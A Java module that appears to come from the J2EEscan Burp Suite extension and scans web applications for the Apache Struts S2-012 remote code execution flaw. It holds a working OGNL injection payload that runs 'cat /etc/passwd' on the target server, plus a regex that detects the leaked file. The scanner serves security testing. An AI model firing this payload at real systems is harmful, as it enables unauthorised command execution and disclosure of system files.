package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.PrintWriter;

public class StrutsS2012 implements IModule {

    private static final String TITLE = "Struts S2-012 RCE reflected";
    private static final String DESCRIPTION = "J2EEscan identified  S2-012 RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-012.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-012<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-012";
    private PrintWriter stderr;
    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private static final List<Pattern> PASSWORDFILE_REGEX = Arrays.asList(
            Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
    // TODO FIXME Disable these patterns to avoid FP

    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private static final List<byte[]> PAYLOAD_INJ = Arrays.asList(
            "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n".getBytes());

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        for (byte[] INJ_TEST : PAYLOAD_INJ) {
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            String response = helpers.bytesToString(checkRequestResponse.getResponse());

            for (Pattern xincludeMatcher : PASSWORDFILE_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Firm
                    ));
                    return issues;
                }
            }
        }

        return issues;
    }
}
